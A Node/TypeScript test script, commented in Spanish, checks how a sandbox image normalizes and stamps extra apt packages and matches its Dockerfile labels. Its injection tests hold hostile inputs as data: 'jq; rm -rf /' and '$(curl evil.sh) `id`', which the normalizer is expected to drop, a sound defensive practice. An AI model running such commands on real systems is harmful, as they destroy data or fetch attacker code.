#!/usr/bin/env node
// =============================================================================
// Prueba de los EXTRAS de la imagen del sandbox (npm run test:sandbox-extras). Fija la
// NORMALIZACIÓN (la lista se expande SIN COMILLAS en el Dockerfile: un `;` o `$(...)`
// tiene que caerse, no colarse), el ORDEN ESTABLE (reordenar no debe forzar un
// rebuild), que el sello coincide con el LABEL del Dockerfile (si divergen, cada
// apertura de agente reconstruye) y que el preset de documentos es reversible sin
// llevarse lo que el usuario escribió a mano.
// =============================================================================

import { readFileSync } from 'node:fs'
import path from 'node:path'
import { fileURLToPath } from 'node:url'
import {
  PRESET_DOCUMENTOS,
  SANDBOX_IMAGE_VERSION,
  argsBuildExtras,
  conDocumentos,
  extrasDesdeSello,
  normalizarExtras,
  normalizarPaquetes,
  selloExtras,
  sinDocumentos,
  tieneDocumentos
} from './sandboxExtras.ts'

// ---------------------------------------------------------------------------
function hr(title: string): void {
  console.log('\n' + '='.repeat(78))
  console.log(title)
  console.log('='.repeat(78))
}
interface CheckResult {
  name: string
  pass: boolean
  evidence: string
}
const results: CheckResult[] = []
function check(name: string, pass: boolean, evidence: string): void {
  results.push({ name, pass, evidence })
  console.log(`  [${pass ? 'PASS' : 'FAIL'}] ${name} -> ${evidence}`)
}

function main(): void {
  // -------------------------------------------------------------------------
  hr('1) NORMALIZACIÓN de la lista de paquetes')
  {
    const r = normalizarPaquetes('  poppler-utils,  imagemagick   poppler-utils\njq ')
    check(
      'separa por espacios, comas y saltos; quita duplicados',
      r.join(' ') === 'imagemagick jq poppler-utils',
      r.join(' ')
    )

    const veneno = normalizarPaquetes('jq; rm -rf /')
    check(
      'descarta lo que no es un nombre de paquete (inyección de shell)',
      !veneno.includes('jq;') && !veneno.includes('/') && !veneno.some((p) => p.includes(';')),
      JSON.stringify(veneno)
    )

    const sub = normalizarPaquetes('$(curl evil.sh) `id` foo&&bar')
    check(
      'descarta sustitución de comandos y operadores',
      sub.length === 0,
      JSON.stringify(sub)
    )

    check(
      'admite arquitectura y versiones con punto (libfoo:i386, python3.11)',
      normalizarPaquetes('libfoo:i386 python3.11').join(' ') === 'libfoo:i386 python3.11',
      normalizarPaquetes('libfoo:i386 python3.11').join(' ')
    )

    check(
      'una entrada que no es lista ni texto da lista vacía',
      normalizarPaquetes(undefined).length === 0 && normalizarPaquetes(42).length === 0,
      'undefined/42 -> []'
    )

    const arr = normalizarPaquetes(['jq', '', '  ', 'jq', 'ripgrep'])
    check('acepta también un array (lo que guarda el slice)', arr.join(' ') === 'jq ripgrep', arr.join(' '))
  }

  // -------------------------------------------------------------------------
  hr('2) ORDEN ESTABLE (el sello no puede depender de cómo se escribió)')
  {
    const a = normalizarExtras('ripgrep jq', false)
    const b = normalizarExtras('jq  ripgrep', false)
    check('mismo conjunto, mismo sello', selloExtras(a) === selloExtras(b), selloExtras(a))
    check(
      'el flag del navegador SÍ cambia el sello',
      selloExtras(normalizarExtras('jq', true)) !== selloExtras(normalizarExtras('jq', false)),
      `${selloExtras(normalizarExtras('jq', true))} vs ${selloExtras(normalizarExtras('jq', false))}`
    )
    check(
      'lista vacía y navegador apagado dan el sello neutro',
      selloExtras(normalizarExtras([], false)) === '|0',
      selloExtras(normalizarExtras([], false))
    )
  }

  // -------------------------------------------------------------------------
  hr('3) SELLO y BUILD-ARGS: la misma forma que el LABEL del Dockerfile')
  {
    const e = normalizarExtras('jq ripgrep', true)
    const args = argsBuildExtras(e)
    check(
      'se pasan SIEMPRE los dos --build-arg (también vacíos)',
      args.filter((a) => a === '--build-arg').length === 2,
      args.join(' ')
    )
    const apt = args[args.indexOf('--build-arg') + 1]
    const deps = args[args.lastIndexOf('--build-arg') + 1]
    check('EXTRA_APT lleva la lista separada por espacios', apt === 'EXTRA_APT=jq ripgrep', apt ?? '')
    check('PLAYWRIGHT_DEPS es 0 ó 1', deps === 'PLAYWRIGHT_DEPS=1', deps ?? '')
    // El Dockerfile sella `LABEL tessera.sandbox.extras="${EXTRA_APT}|${PLAYWRIGHT_DEPS}"`.
    // Reconstruirlo aquí desde los args es lo que garantiza que las dos formas no
    // diverjan: si divergen, la imagen se declara obsoleta en CADA arranque.
    const comoElLabel = `${apt?.slice('EXTRA_APT='.length)}|${deps?.slice('PLAYWRIGHT_DEPS='.length)}`
    check('el sello coincide con lo que estampa el Dockerfile', comoElLabel === selloExtras(e), comoElLabel)
  }

  // -------------------------------------------------------------------------
  hr('4) PRESET de documentos')
  {
    check('la lista vacía no lo tiene', !tieneDocumentos([]), 'false')
    const con = conDocumentos(['jq'])
    check('activarlo añade el preset entero y conserva lo del usuario', tieneDocumentos(con) && con.includes('jq'), con.join(' '))
    check(
      'incluye poppler (PDF->PNG) y los tres LibreOffice',
      ['poppler-utils', 'libreoffice-writer', 'libreoffice-calc', 'libreoffice-impress'].every((p) =>
        PRESET_DOCUMENTOS.includes(p)
      ),
      PRESET_DOCUMENTOS.join(' ')
    )
    const sin = sinDocumentos(con)
    check('desactivarlo lo quita y NO se lleva lo del usuario', sin.join(' ') === 'jq', sin.join(' '))
    check(
      'activar dos veces no duplica',
      conDocumentos(con).length === con.length,
      `${con.length} -> ${conDocumentos(con).length}`
    )
    check(
      'el campo "otros" no enseña los paquetes del preset',
      sinDocumentos(con).join(' ') === 'jq',
      sinDocumentos(con).join(' ')
    )
    check(
      'preset a medias NO cuenta como activo (una imagen a medias miente)',
      !tieneDocumentos(PRESET_DOCUMENTOS.slice(1)),
      PRESET_DOCUMENTOS.slice(1).join(' ')
    )
  }

  // -------------------------------------------------------------------------
  hr('5) EL SELLO SE LEE DE VUELTA (lo que hay horneado de verdad)')
  {
    const e = normalizarExtras('jq ripgrep', true)
    const ida = extrasDesdeSello(selloExtras(e))
    check(
      'ida y vuelta: sello -> extras -> mismo sello',
      selloExtras(ida) === selloExtras(e),
      selloExtras(ida)
    )
    check(
      'el sello neutro se lee como "nada horneado"',
      extrasDesdeSello('|0').apt.length === 0 && extrasDesdeSello('|0').depsNavegador === false,
      JSON.stringify(extrasDesdeSello('|0'))
    )
    // Prudencia: una imagen ANTERIOR al sellado no tiene la etiqueta, y el template
    // de docker devuelve "<no value>". Prometer herramientas ahí sería lo peor.
    check(
      'una etiqueta ausente o con otra forma NO promete herramientas',
      extrasDesdeSello('<no value>').apt.length === 0 &&
        extrasDesdeSello('').apt.length === 0 &&
        extrasDesdeSello('<no value>').depsNavegador === false,
      'sin etiqueta -> extras vacíos'
    )
  }

  // -------------------------------------------------------------------------
  hr('6) LOS GEMELOS DE LA VERSIÓN NO PUEDEN DIVERGIR')
  {
    // `SANDBOX_IMAGE_VERSION` y el `LABEL tessera.sandbox.version` del Dockerfile son
    // el mismo número escrito en dos ficheros. Si divergen no falla nada visible:
    // simplemente CADA creación de contenedor paga un `docker build` que no arregla
    // nada, para siempre, porque la imagen recién construida sigue sin cuadrar. Por
    // eso el test lee el Dockerfile de verdad en vez de fiarse.
    const aqui = path.dirname(fileURLToPath(import.meta.url))
    const dockerfile = path.resolve(aqui, '../../docker/sandbox/Dockerfile')
    const texto = readFileSync(dockerfile, 'utf-8')
    const m = texto.match(/LABEL\s+tessera\.sandbox\.version="([^"]+)"/)
    check('el Dockerfile declara su etiqueta de versión', m !== null, m ? m[1] : '(no encontrada)')
    check(
      'la versión del Dockerfile y SANDBOX_IMAGE_VERSION coinciden',
      m !== null && m[1] === SANDBOX_IMAGE_VERSION,
      `Dockerfile=${m ? m[1] : '?'} código=${SANDBOX_IMAGE_VERSION}`
    )
    check(
      'el Dockerfile sella los extras con la misma forma que selloExtras',
      /LABEL\s+tessera\.sandbox\.extras="\$\{EXTRA_APT\}\|\$\{PLAYWRIGHT_DEPS\}"/.test(texto),
      'LABEL tessera.sandbox.extras="${EXTRA_APT}|${PLAYWRIGHT_DEPS}"'
    )
  }

  // -------------------------------------------------------------------------
  for (const r of results) {
    console.log(`${r.pass ? 'PASS' : 'FAIL'}  ${r.name}`)
    console.log(`      -> ${r.evidence}`)
  }
  const passed = results.filter((r) => r.pass).length
  const total = results.length
  const allPass = passed === total
  hr(`VEREDICTO: ${passed}/${total} PASS — ${allPass ? 'TODO PASS' : 'HAY FAIL'}`)
  process.exit(allPass ? 0 : 1)
}

main()
